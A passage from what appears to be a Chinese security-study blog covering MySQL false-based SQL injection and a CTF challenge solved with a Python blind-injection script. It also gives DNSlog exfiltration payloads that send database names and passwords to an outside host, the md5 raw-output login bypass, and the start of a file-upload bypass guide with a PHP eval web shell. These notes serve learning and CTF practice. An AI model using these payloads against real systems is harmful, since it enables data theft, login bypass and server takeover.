<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203516-cfavxud.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203516-cfavxud.png" alt="img"></a></p>
<p>和上面是同一个表，但是为什么这里只返回了两组数据呢？说到这里不得不说一说有关于 MYSQL 的隐式类型转换。</p>
<p>MYSQL 的隐式类型转换，即当字符串和数字比较时，会把字符串转为浮点数，而字符串转换为浮点数很明显会转换失败，这时就会产生一个warning，转换的结果为0，然后<code>0 = 0</code> 返回的是 <code>True</code> ，这样就将表中的数据全部返回了。但如果字符串开头是数字话还是会从数字部分截断，转换为数字进行比较，在第二个例子中，passwd 字段中有一个值是以数字1开头的并非为0，再进行 <code>passwd = 0</code> 比较时，会从1开始截断，<code>1 = 0</code> 不成立，当然就只返回两条数据了。这就是 MYSQL False 注入的原理。</p>
<h5 id="False-注入利用"><a href="#False-注入利用" class="headerlink" title="False 注入利用"></a>False 注入利用</h5><p>下面我们讲讲 False 注入如何利用，及如何构造 False 注入的利用点。在实际中我们接触到的语句都是带有引号的，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username =&#x27;.$username.&#x27;;</span><br></pre></td></tr></table></figure>

<p>在这种情况下，我们如何绕过引号构造出 0 这个值呢，我们需要做一些处理来构造false注入的<strong>利用点</strong>？</p>
<p>可以使用的姿势有很多，比如下面的算数运算：</p>
<ul>
<li>利用算数运算</li>
</ul>
<p>加：+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入&#x27;+&#x27;, 拼接的语句: select * from user where username =&#x27;&#x27;+&#x27;&#x27;;</span><br></pre></td></tr></table></figure>

<p>减：-</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入&#x27;-&#x27;, 拼接的语句: select * from user where username =&#x27;&#x27;-&#x27;&#x27;;</span><br></pre></td></tr></table></figure>

<p>乘：*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入&#x27;*&#x27;, 拼接的语句: select * from user where username =&#x27;&#x27;*&#x27;&#x27;;</span><br></pre></td></tr></table></figure>

<p>除：&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入&#x27;/6#, 拼接的语句: select * from user where username =&#x27;&#x27;/6#&#x27;;</span><br></pre></td></tr></table></figure>

<p>取余：%</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入&#x27;%1#, 拼接的语句: select * from user where username =&#x27;&#x27;%1#&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li>利用位操作运算</li>
</ul>
<p>我们还可以使用当字符串和数字运算的时候类型转换的问题进行利用。</p>
<p>和运算：&amp;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入&#x27;&amp;0#, 拼接的语句: select * from user where username =&#x27;&#x27;&amp;0#&#x27;;</span><br></pre></td></tr></table></figure>

<p>或运算：|</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入&#x27;|0#, 拼接的语句: select * from user where username =&#x27;&#x27;|0#&#x27;;</span><br></pre></td></tr></table></figure>

<p>异或运算：^</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入&#x27;^0#, 拼接的语句: select * from user where username =&#x27;&#x27;^0#&#x27;;</span><br></pre></td></tr></table></figure>

<p>移位操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">插入&#x27;&lt;&lt;0# 或 &#x27;&gt;&gt;0#, 拼接的语句: </span><br><span class="line">select * from user where username =&#x27;&#x27;&lt;&lt;0#&#x27;;</span><br><span class="line">select * from user where username =&#x27;&#x27;&gt;&gt;0#&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li>利用比较运算符</li>
</ul>
<p>安全等于：&lt;&#x3D;&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;=0&lt;=&gt;1# 拼接的语句：where username=&#x27;&#x27;=0&lt;=&gt;1#&#x27;</span><br></pre></td></tr></table></figure>

<p>不等于&lt;&gt;(!&#x3D;)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;=0&lt;&gt;0# 拼接的语句：where username=&#x27;&#x27;=0&lt;&gt;0#&#x27;</span><br></pre></td></tr></table></figure>

<p>大小于&gt;或&lt;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;-1# 拼接的语句：where username=&#x27;&#x27;&gt;-1#</span><br></pre></td></tr></table></figure>

<ul>
<li>其他</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+1 is not null#  &#x27;in(-1,1)#  &#x27;not in(1,0)#  &#x27;like 1#  &#x27;REGEXP 1#  &#x27;BETWEEN 1 AND 1#  &#x27;div 1#  &#x27;xor 1#  &#x27;=round(0,1)=&#x27;1  &#x27;&lt;&gt;ifnull(1,2)=&#x27;1</span><br></pre></td></tr></table></figure>

<h5 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h5><p>false注入这种注入方式有的优势就是，<strong>在某些特定时候可以绕过WAF或者是一些其他的绕过</strong>。</p>
<p>这里举例一道题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include(&quot;config.php&quot;);  </span><br><span class="line">$conn -&gt;query(&quot;set names utf8&quot;);  </span><br><span class="line"></span><br><span class="line">function randStr($lenth=32)&#123;</span><br><span class="line">     $strBase = &quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;;</span><br><span class="line">     $str = &quot;&quot;;</span><br><span class="line">     while($lenth&gt;0)&#123;</span><br><span class="line">       $str.=substr($strBase,rand(0,strlen($strBase)-1),1);</span><br><span class="line">       $lenth --;</span><br><span class="line">     &#125;</span><br><span class="line">    return $str;</span><br><span class="line">&#125;</span><br><span class="line">if($install)&#123;</span><br><span class="line">     $sql = &quot;create table `user` (          `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,          `username` varchar(30) NOT NULL,          `passwd` varchar(32) NOT NULL,          `role` varchar(30) NOT NULL        )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;;</span><br><span class="line">     if($conn-&gt;query($sql))&#123;</span><br><span class="line">        $sql  = &quot;insert into `user`(`username`,`passwd`,`role`) values (&#x27;admin&#x27;,&#x27;&quot;.md5(randStr()).&quot;&#x27;,&#x27;admin&#x27;)&quot;;</span><br><span class="line">        $conn -&gt; query($sql);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line">function filter($str)&#123;</span><br><span class="line">      $filter = &quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;.urldecode(&#x27;%09&#x27;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#x27;%0c&#x27;).&quot;|&quot;.urldecode(&#x27;%0d&#x27;).&quot;|&quot;.urldecode(&#x27;%a0&#x27;).&quot;/i&quot;;</span><br><span class="line">      if(preg_match($filter,$str))&#123;</span><br><span class="line">          die(&quot;you can&#x27;t input this illegal char!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      return $str;</span><br><span class="line">  &#125;   </span><br><span class="line"></span><br><span class="line">function show($username)&#123;</span><br><span class="line">   global $conn;</span><br><span class="line">   $sql = &quot;select role from `user` where username =&#x27;&quot;.$username.&quot;&#x27;&quot;;</span><br><span class="line">   $res = $conn -&gt;query($sql);</span><br><span class="line">   if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        echo &quot;$username is &quot;.$res-&gt;fetch_assoc()[&#x27;role&#x27;];</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">        die(&quot;Don&#x27;t have this user!&quot;);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line">function login($username,$passwd)&#123;</span><br><span class="line">     global $conn;</span><br><span class="line">     global $flag;</span><br><span class="line">     $username = trim(strtolower($username));</span><br><span class="line">     $passwd = trim(strtolower($passwd));</span><br><span class="line">     if($username == &#x27;admin&#x27;)&#123;</span><br><span class="line">         die(&quot;you can&#x27;t login this as admin!&quot;);</span><br><span class="line">     &#125;  </span><br><span class="line">     $sql = &quot;select * from `user` where username=&#x27;&quot;.$conn-&gt;escape_string($username).&quot;&#x27; and passwd=&#x27;&quot;.$conn-&gt;escape_string($passwd).&quot;&#x27;&quot;;</span><br><span class="line">     $res = $conn -&gt;query($sql);</span><br><span class="line">     if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">           if($res-&gt;fetch_assoc()[&#x27;role&#x27;] === &#x27;admin&#x27;) exit($flag);</span><br><span class="line">     &#125;else&#123; </span><br><span class="line">           echo &quot;sorry,username or passwd error!&quot;;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">  function source()&#123;</span><br><span class="line">      highlight_file(__FILE__);</span><br><span class="line"> &#125;</span><br><span class="line">  $username = isset($_POST[&#x27;username&#x27;])?filter($_POST[&#x27;username&#x27;]):&quot;&quot;;</span><br><span class="line">  $passwd = isset($_POST[&#x27;passwd&#x27;])?filter($_POST[&#x27;passwd&#x27;]):&quot;&quot;;</span><br><span class="line">  $action = isset($_GET[&#x27;action&#x27;])?filter($_GET[&#x27;action&#x27;]):&quot;source&quot;;</span><br><span class="line"></span><br><span class="line">switch($action)&#123;</span><br><span class="line">    case &quot;source&quot;: source(); break ;</span><br><span class="line">    case &quot;login&quot; : login($username,$passwd);break;</span><br><span class="line">    case &quot;show&quot; : show($username);break; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们注意到<code>filter()</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = &quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;.urldecode(&#x27;%09&#x27;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#x27;%0c&#x27;).&quot;|&quot;.urldecode(&#x27;%0d&#x27;).&quot;|&quot;.urldecode(&#x27;%a0&#x27;).&quot;/i&quot;;</span><br></pre></td></tr></table></figure>

<p>这里看起来过滤的比较多，其中and，or还有&amp;，|都被过滤了，这个时候就可以利用<strong>false进行盲注</strong>。</p>
<p>可以在show函数利用查询的时候注入，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = &quot;admin&#x27;^!(mid((passwd)from(-&#123;pos&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1&quot;</span><br></pre></td></tr></table></figure>

<p>这里官方给出的就是利用异或，其实这里并不需要 admin 只要是一串字符串就可以</p>
<p>异或会使字符串都转为浮点型，都变为了0，由于<code>0=0^0 -&gt; 1^0 -&gt; 1</code> 当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多还有就是构造的payload比较简短，例如’<code>+</code>‘、’<code>^</code>‘、’<code>/4#</code>‘ 这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。</p>
<h5 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for str in &quot;abcdefghijklmnopkrstuvwxyz&quot;:</span><br><span class="line">        url = &quot;http://cc248a80-6376-49cf-b846-16c188eeb1fc.node3.buuoj.cn/Less-8/?id=&#x27;^(mid((select database())from(-&#123;0&#125;))=&#x27;&#123;1&#125;&#x27;)=&#x27;1&quot;.format(i,str+flag)</span><br><span class="line">        res = requests.get(url=url)</span><br><span class="line">        if &quot;You are in...........&quot; in res.text:</span><br><span class="line">            flag = str+flag</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>

<h4 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志。</p>
<p>在无法直接利用的情况下，但是可以通过DNS请求,通过DNSlog，把数据外带，用DNS解析记录查看。</p>
<h5 id="LOAD-FILE-读取文件的函数"><a href="#LOAD-FILE-读取文件的函数" class="headerlink" title="LOAD_FILE() 读取文件的函数"></a>LOAD_FILE() 读取文件的函数</h5><blockquote>
<p>读取文件并返回文件内容为字符串。</p>
<p>要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p>
</blockquote>
<p><strong>注：这个功能不是默认开启的，需要在mysql配置文件加一句 secure_file_priv&#x3D;</strong></p>
<h5 id="DNSLOG平台"><a href="#DNSLOG平台" class="headerlink" title="DNSLOG平台:"></a>DNSLOG平台:</h5><blockquote>
<p><a target="_blank" rel="noopener" href="https://dns.咕.com/">https://dns.xn--9tr.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://log.咕.com/">https://log.xn--9tr.com/</a></p>
</blockquote>
<h5 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h5><blockquote>
<p>UNC路径通用命名规则，也称通用命名规范、通用命名约定，类似\softer这样的形式的网络路径。</p>
</blockquote>
<p>UNC路径的 <strong>格式</strong> ：<strong>\server\sharename\directory\filename</strong></p>
<p>等同于<strong>SELECT LOAD_FILE(‘&#x2F;&#x2F;库名.1806dl.dnslog.cn&#x2F;abc’</strong></p>
<p>去访问 库名.1806dl.dnslog.cn 的服务器下的共享文件夹abc。</p>
<p>然后1806dl.dnslog.cn的子域名的解析都是在某台服务器，然后他记录下来了有人请求访问了error.1806dl.dnslog.cn，然后在DnsLog这个平台上面显示出来了</p>
<p>payload示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;, database(),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;, (select table_name from information_schema.tables where table_schema=database() limit 0,1 ),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;,(select column_name from information_schema.columns where table_name=’admin’ and table_schema=database() limit 2,1),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;,(select password from admin limit 0,1),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure>

<h4 id="‘“-md5-pass-true-”‘-登录绕过"><a href="#‘“-md5-pass-true-”‘-登录绕过" class="headerlink" title="‘“.md5($pass,true).”‘ 登录绕过"></a>‘“.md5($pass,true).”‘ 登录绕过</h4><p>很多站点为了安全都会利用这样的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE password = &#x27;.md5($password,true).&#x27;;</span><br></pre></td></tr></table></figure>

<p><code>md5(string,true)</code> 函数在指定了true的时候，是返回的原始 16 字符二进制格式，也就是说会返回这样子的字符串：<code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>：</p>
<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129143258-ladbvll.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129143258-ladbvll.png" alt="img"></a></p>
<p>这不是普通的二进制字符串，而是 <code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code> 这种，这样的话就会和前面的形成闭合，构成万能密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE password = &#x27;&#x27;or&#x27;6.......&#x27;</span><br></pre></td></tr></table></figure>

<p>这就是永真的了，这就是一个万能密码了相当于 <code>1&#39; or 1=1#</code> 或 <code>1&#39; or 1#</code>。</p>
<blockquote>
<p>但是我们思考一下为什么 6\xc9]\x99\xe9!r,\xf9\xedb\x1c 的布尔值是true呢？</p>
<p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数（这类似于PHP的弱类型）。要注意的是这种情况是必须要有单引号括起来的，比如 password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于 password&#x3D;‘xxx’ or true，所以返回值就是true。这里不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如 password&#x3D;‘xxx’ or 1，那么返回值也是 true。（xxx指代任意字符）</p>
</blockquote>
<p>接下来就是找到这样子的字符串，这里给出两个吧。</p>
<p>ffifdyop：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>

<p>129581926211651571912466741651878684928：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8</span><br><span class="line">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/10/10/file_upload/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="星河风">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/10/file_upload/" class="post-title-link" itemprop="url">文件上传</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-10 18:38:57" itemprop="dateCreated datePublished" datetime="2023-10-10T18:38:57+08:00">2023-10-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-10-22 16:44:55" itemprop="dateModified" datetime="2023-10-22T16:44:55+08:00">2023-10-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Summar/" itemprop="url" rel="index"><span itemprop="name">Summar</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h1><p>正常上传文件,捉取数据包修改（bp抓包改后缀）</p>
<h1 id="后端绕过"><a href="#后端绕过" class="headerlink" title="后端绕过"></a>后端绕过</h1><p>服务器端检测的绕过</p>
<h2 id="函数特性"><a href="#函数特性" class="headerlink" title="函数特性"></a>函数特性</h2><p>move_uploaded_file函数会自动去除文件名末尾的点 和 &#x2F;.</p>
<p><code>fopen</code>函数特性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=&#x27;1.php/.&#x27;;</span><br><span class="line">$content=&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;</span><br><span class="line">$f = fopen($filename, &#x27;w&#x27;);</span><br><span class="line">    fwrite($f, $content);</span><br><span class="line">    fclose($f);    </span><br><span class="line">?&gt; </span><br><span class="line">#会在当前目录生成1.php,文件名为1.php.也可以</span><br><span class="line">————————————————</span><br></pre></td></tr></table></figure>

<h5 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h5><p>后缀名大小写</p>
<p>后缀名双写</p>
<p><code>尝试php3 phtml php3457(linux+apache+php5.6)等后缀</code></p>
<p>检测MIME类型的,捉包改MIME类型</p>
<h3 id="服务端检测（MINE类型检测）"><a href="#服务端检测（MINE类型检测）" class="headerlink" title="服务端检测（MINE类型检测） #"></a>服务端检测（MINE类型检测） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-mine%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B">#</a></h3><blockquote>
<p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p>
</blockquote>
<p>服务器代码判断$_FILES[”file“][“type”]是不是图片格式（<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>），如果不是，则不允许上传该文件。</p>
<p>绕过方法：</p>
<blockquote>
<p>抓包后更改Content-Type为允许的类型绕过该代码限制，比如将php文件的<code>Content-Type:application/octet-stream</code>修改为<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>等就可以</p>
</blockquote>
<p>常见MIMETYPE</p>
<blockquote>
<p>audio&#x2F;mpeg -&gt; .mp3 application&#x2F;msword -&gt; .doc application&#x2F;octet-stream -&gt; .exe application&#x2F;pdf -&gt; .pdf application&#x2F;x-javascript -&gt; .js application&#x2F;x-rar -&gt; .rar application&#x2F;zip -&gt; .zip image&#x2F;gif -&gt; .gif image&#x2F;jpeg -&gt; .jpg &#x2F; .jpeg image&#x2F;png -&gt; .png text&#x2F;plain -&gt; .txt text&#x2F;html -&gt; .html video&#x2F;mp4 -&gt; .mp4</p>
</blockquote>
<h3 id="服务端检测（目录路径检测）"><a href="#服务端检测（目录路径检测）" class="headerlink" title="服务端检测（目录路径检测） #"></a>服务端检测（目录路径检测） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84%E6%A3%80%E6%B5%8B">#</a></h3><p>对目录路径的检测不够严谨而导致可以使用%00截断绕过进行攻击。</p>
<p>绕过方法:</p>
<blockquote>
<ul>
<li>例如：&#x2F;111.php%00.gif&#x2F;111.gif -&gt; &#x2F;111.php</li>
</ul>
</blockquote>
<h3 id="服务端检测（文件扩展名检测）"><a href="#服务端检测（文件扩展名检测）" class="headerlink" title="服务端检测（文件扩展名检测） #"></a>服务端检测（文件扩展名检测） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E6%A3%80%E6%B5%8B">#</a></h3><p>绕过方法：</p>
<blockquote>
<ul>
<li>文件名大小写绕过，如：<code>*.pHp</code> <code>*.aSP</code></li>
<li>文件名双写绕过，如：<code>*.pphphp</code></li>
<li>Unicode： 当目标存在json_decode且检查在json_decode之前,可以将php写为<code>\u0070hp</code></li>
<li>名单列表绕过，如：<code>*.asa</code> <code>*.cer</code></li>
<li>特殊文件名绕过，比如windows文件名最后不能有.或空格，可设为<code>*.php.</code>或<code>*.php+</code></li>
<li>0x00截断绕过，比如：<code>*.php(0x00).jpg</code> 或 <code>*.php%00.jpg</code></li>
<li>文件包含漏洞</li>
<li>服务器解析漏洞</li>
<li>.htaccess文件攻击</li>
</ul>
</blockquote>
<h3 id="文件截断绕过攻击"><a href="#文件截断绕过攻击" class="headerlink" title="文件截断绕过攻击 #"></a>文件截断绕过攻击 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BB">#</a></h3><blockquote>
<p>截断类型：PHP%00截断</p>
<p>截断原理：由于00代表结束符，所以会把00后面的所有字符删除</p>
<p>截断条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态</p>
</blockquote>
<p>绕过方法：</p>
<blockquote>
<ul>
<li>例如上传文件shell.php，上传文件路径为&#x2F;?upload&#x3D;shell.php</li>
<li>绕过：&#x2F;?upload&#x3D;shell.php%00.jpg -&gt; &#x2F;?upload&#x3D;shell.php</li>
</ul>
</blockquote>
<h3 id="解析漏洞攻击"><a href="#解析漏洞攻击" class="headerlink" title="解析漏洞攻击 #"></a>解析漏洞攻击 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB">#</a></h3><p>主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞。</p>
<h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析 #"></a>目录解析 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90">#</a></h4><blockquote>
<ul>
<li>形式：<code>www.xxx.com/xxx.asp/xxx.jpg</code></li>
<li>原理：服务器会默认把 <code>.asp</code> 和 <code>.asp</code>目录下的文件都解析成asp文件</li>
